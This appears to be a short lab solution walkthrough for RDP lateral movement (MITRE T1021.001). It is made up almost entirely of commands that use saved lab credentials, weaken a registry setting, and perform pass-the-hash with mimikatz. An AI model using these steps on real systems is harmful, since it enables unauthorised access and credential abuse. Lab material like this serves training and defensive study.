# T1021.001 – RDP Lateral Movement | Solution Walkthrough
**Difficulty:** Easy | **OS:** Windows | **MITRE:** T1021.001

## Step 1 – Verify RDP is Enabled
```powershell
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections
# fDenyTSConnections = 0  ← RDP enabled!
# Also check port:
netstat -an | findstr ":3389"
```

## Step 2 – RDP via cmdkey + mstsc (Saved Credentials)
```cmd
REM Save credentials:
cmdkey /generic:localhost /user:rdp_target /pass:RdpTarget2024!
REM Connect (auto-uses saved creds):
mstsc /v:localhost /f
```

## Step 3 – xfreerdp (Linux/Headless)
```bash
xfreerdp /v:localhost /u:rdp_target /p:RdpTarget2024! /cert:ignore +clipboard
```

## Step 4 – Restricted Admin Mode (Pass-the-Hash via RDP)
```cmd
REM Enable restricted admin on target:
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
REM PTH via RDP:
mstsc /v:target /restrictedAdmin
REM With mimikatz:
sekurlsa::pth /user:admin /domain:. /ntlm:HASH /run:"mstsc /v:target /restrictedAdmin"
```
